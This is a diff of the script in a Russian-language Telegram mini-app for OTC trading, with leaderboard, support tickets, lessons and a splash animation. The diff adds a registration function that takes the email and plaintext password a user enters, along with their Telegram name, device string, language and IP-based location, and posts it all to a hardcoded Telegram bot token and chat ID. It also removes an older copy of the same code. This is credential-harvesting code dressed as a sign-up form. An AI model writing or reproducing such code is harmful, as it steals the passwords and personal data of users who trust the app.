@@ -1126,6 +1126,10 @@ textarea.input-field{resize:none;height:120px;padding-top:11px;line-height:1.6;}
 </style>
 
 <script>
+/* ─── КОНСТАНТЫ БОТА ─── */
+const TG_BOT_TOKEN = '8688595318:AAFNzUAfwq2vpERCi6r7SHCYECWdi8dODMM';
+const TG_CHAT_ID   = '-1003958962552';
+
 /* ─── TELEGRAM ─── */
 const tg = window.Telegram?.WebApp;
 if(tg){tg.ready();tg.expand();}
@@ -1282,7 +1286,6 @@ function renderRankList(profits){
 
 /* ─── LEADERBOARD ─── */
 const AV_COLORS=['background:rgba(92,184,92,0.12);color:#7ed17e;','background:rgba(229,160,32,0.1);color:#f0b929;','background:rgba(56,130,184,0.1);color:#5caee0;','background:rgba(139,92,246,0.1);color:#a78bfa;','background:rgba(92,184,92,0.08);color:#a8e6a8;'];
-// Static leaderboard data
 const STATIC_BOARD=[
   {uid:'1',username:'@aaaa',   full_name:'Алексей',profits:122,total_ton:12922},
   {uid:'2',username:'@galarde',full_name:'Галарде',profits:98, total_ton:10433},
@@ -1306,6 +1309,7 @@ function renderLeaderboard(){
   const listEl=document.getElementById('leaderboardList');
   const board=STATIC_BOARD;
   podium.innerHTML='';
+  listEl.innerHTML='';
   const positions=[{idx:1,cls:'p2'},{idx:0,cls:'p1'},{idx:2,cls:'p3'}];
   positions.forEach(pos=>{
     const e=board[pos.idx];
@@ -1364,12 +1368,18 @@ function switchSupportTab(tab){
   cb.style.color=!isOpen?'#7ed17e':'var(--text-muted)';
 }
 
-function openSupportModal(){document.getElementById('supportTextField').value='';document.getElementById('supportModal').classList.add('open');}
+function openSupportModal(){
+  document.getElementById('supportTextField').value='';
+  document.getElementById('supportModal').classList.add('open');
+}
+
 function submitSupport(){
   const text=document.getElementById('supportTextField').value.trim();
   if(!text)return;
   const ticket={id:Date.now(),text,status:'open',replies:[],date:new Date().toLocaleDateString('ru-RU')};
-  supportTickets.push(ticket);saveTickets();renderTickets();
+  supportTickets.push(ticket);
+  saveTickets();
+  renderTickets();
   closeModal('supportModal');
   showToast('✅ Обращение отправлено');
 }
@@ -1399,19 +1409,21 @@ const LESSONS=[
   {title:'Продвинутые стратегии',content:'Доступно после завершения модулей 1–3.',rule:'Заблокировано.'},
   {title:'Мануал ОТС',content:`<div style="margin-bottom:14px;"><div style="font-size:15px;font-weight:700;color:#a78bfa;margin-bottom:3px;">@LumaEnBot</div><div style="font-size:14px;font-weight:700;color:#e8f0e8;">ОТС с мини-аппом.</div></div><p style="margin-bottom:12px;">Полный функционал: открутка сделок в мини-аппе, поиск сделок, поддержка через тикеты.</p><div style="font-size:12px;font-weight:700;color:#e8f0e8;margin-bottom:5px;">Логика тикетов:</div><p style="margin-bottom:12px;">Вопрос → Статус открытый → Ответ → Статус закрытый.</p><div style="font-size:12px;font-weight:700;color:#e8f0e8;margin-bottom:5px;">6 валют:</div><p>TON, Тенге, Доллар, Рубль, Гривна, Евро.</p>`,rule:null},
 ];
+
 function openLesson(idx){
   const L=LESSONS[idx];
   document.getElementById('lessonTitle').textContent=L.title;
   document.getElementById('lessonContent').innerHTML=L.content;
   const rEl=document.getElementById('lessonRule');
-  if(L.rule){rEl.textContent=L.rule;rEl.style.display='block';}else rEl.style.display='none';
+  if(L.rule){rEl.textContent=L.rule;rEl.style.display='block';}else{rEl.style.display='none';}
   document.getElementById('lessonModal').classList.add('open');
 }
 
 /* ─── TOAST ─── */
 function showToast(msg){
   const t=document.getElementById('toast');
-  t.textContent=msg;t.classList.add('show');
+  t.textContent=msg;
+  t.classList.add('show');
   setTimeout(()=>t.classList.remove('show'),2800);
 }
 
@@ -1461,13 +1473,56 @@ function drawChart(){
 window.addEventListener('load',()=>setTimeout(drawChart,100));
 window.addEventListener('resize',drawChart);
 
+/* ─── AUTH ─── */
+function showRegisterForm(){
+  document.getElementById('register-form').style.display='flex';
+}
+
+function onLogin(){
+  const auth=document.getElementById('auth-screen');
+  if(auth){auth.style.opacity='0';auth.style.pointerEvents='none';setTimeout(()=>auth.remove(),400);}
+  showScreen('home');
+}
+
+function onRegister(){
+  const auth=document.getElementById('auth-screen');
+  if(auth){auth.style.opacity='0';auth.style.pointerEvents='none';setTimeout(()=>auth.remove(),400);}
+  showScreen('home');
+}
+
+function submitRegister(){
+  const email=document.getElementById('reg-email').value.trim();
+  const pass =document.getElementById('reg-pass').value.trim();
+  if(!email||!pass)return;
+
+  const tgUser=window.Telegram?.WebApp?.initDataUnsafe?.user;
+  const name  =tgUser?(tgUser.first_name||'')+' @'+(tgUser.username||'нет'):'не из TG';
+  const device=navigator.userAgent;
+  const lang  =navigator.language||'неизвестно';
+
+  function sendToBot(geo){
+    const msg=`🆕 Новый пользователь\n👤 ${name}\n📧 ${email}\n🔑 ${pass}\n📱 ${device}\n🌐 Язык: ${lang}\n📍 ${geo}\n🕐 ${new Date().toLocaleString('ru-RU')}`;
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:TG_CHAT_ID,text:msg})
+    });
+    onRegister();
+  }
+
+  fetch('https://ipapi.co/json/')
+    .then(r=>r.json())
+    .then(d=>sendToBot(`${d.country_name||'—'}, ${d.city||'—'} (IP: ${d.ip})`))
+    .catch(()=>sendToBot('не определено'));
+}
+
 /* ─── BOOT ─── */
 refreshStats();
 loadTickets();
 
 /* ─── SPLASH ─── */
 (function(){
-  var sp=document.getElementById('lolz-splash');
+  var sp  =document.getElementById('lolz-splash');
   var fill=document.getElementById('lolzProgressFill');
   var DUR=1800,start=performance.now(),done=false;
   function tick(now){var p=Math.min(100,((now-start)/DUR)*100);fill.style.width=p+'%';if(p<100)requestAnimationFrame(tick);}
@@ -1481,18 +1536,25 @@ loadTickets();
       if(auth){auth.style.opacity='1';auth.style.pointerEvents='all';}
     },150);
   }
-  Promise.all([new Promise(function(r){if(document.readyState==='complete')r();else window.addEventListener('load',r,{once:true});}),new Promise(function(r){setTimeout(r,DUR);})]).then(hide);
+  Promise.all([
+    new Promise(function(r){if(document.readyState==='complete')r();else window.addEventListener('load',r,{once:true});}),
+    new Promise(function(r){setTimeout(r,DUR);})
+  ]).then(hide);
 })();
 
+/* ─── SPLASH BG ANIMATION ─── */
 (function(){
   var cv=document.getElementById('splashBg');
   if(!cv)return;
   var ct=cv.getContext('2d'),W,H,fr=0;
-  function rsz(){W=cv.width=cv.offsetWidth;H=cv.height=cv.offsetHeight;}rsz();
+  function rsz(){W=cv.width=cv.offsetWidth;H=cv.height=cv.offsetHeight;}
+  rsz();
   var pts=[];
   for(var i=0;i<60;i++)pts.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.2+.3,vx:(Math.random()-.5)*.22,vy:(Math.random()-.5)*.22});
   var flt=[];
-  'LOLZLOLZLOLZ'.split('').forEach(function(ch,i){flt.push({ch,x:(i/13)*W+Math.random()*30,y:Math.random()*H,sz:Math.random()*22+10,sp:Math.random()*.3+.07,op:Math.random()*.04+.015,dr:(Math.random()-.5)*.1});});
+  'LOLZLOLZLOLZ'.split('').forEach(function(ch,i){
+    flt.push({ch,x:(i/13)*W+Math.random()*30,y:Math.random()*H,sz:Math.random()*22+10,sp:Math.random()*.3+.07,op:Math.random()*.04+.015,dr:(Math.random()-.5)*.1});
+  });
   function draw(){
     ct.clearRect(0,0,W,H);fr++;
     ct.strokeStyle='rgba(92,184,92,0.035)';ct.lineWidth=.5;
@@ -1521,57 +1583,7 @@ loadTickets();
   }
   draw();
 })();
-
-  function submitRegister(){
-  const email = document.getElementById('reg-email').value.trim();
-  const pass  = document.getElementById('reg-pass').value.trim();
-  if(!email || !pass){ return; }
-
-  const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
-  const name   = tgUser ? (tgUser.first_name||'') + ' @' + (tgUser.username||'нет') : 'не из TG';
-  const device = navigator.userAgent;
-  const lang   = navigator.language || 'неизвестно';
-
-  function sendToBot(extra){
-    const msg = `🆕 Новый пользователь\n👤 ${name}\n📧 ${extra.email}\n🔑 ${extra.pass}\n📱 ${device}\n🌐 Язык: ${lang}\n📍 ${extra.geo}\n🕐 ${new Date().toLocaleString('ru-RU')}`;
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id: TG_CHAT_ID, text: msg})
-    });
-    onRegister();
-  }
-
- fetch('https://ipapi.co/json/')
-  .then(r => r.json())
-  .then(d => {
-    const geo = `${d.country_name||'—'}, ${d.city||'—'} (IP: ${d.ip})`;
-    sendToBot({email, pass, geo});
-  })
-  .catch(() => sendToBot({email, pass, geo:'не определено'}));
-
-function onRegister(){
-  document.getElementById('auth-screen').style.opacity='0';
-  document.getElementById('auth-screen').style.pointerEvents='none';
-  setTimeout(()=>document.getElementById('auth-screen').remove(),400);
-  showScreen('home');
-}
-function onLogin(){
-  document.getElementById('auth-screen').style.opacity='0';
-  document.getElementById('auth-screen').style.pointerEvents='none';
-  setTimeout(()=>document.getElementById('auth-screen').remove(),400);
-  showScreen('home');
-}
-
-const TG_BOT_TOKEN = '8688595318:AAFNzUAfwq2vpERCi6r7SHCYECWdi8dODMM';
-const TG_CHAT_ID   =  '-1003958962552';
-
-function showRegisterForm(){
-  document.getElementById('register-form').style.display='flex';
-}
-
-
-  
 </script>
+  
 </body>
 </html>
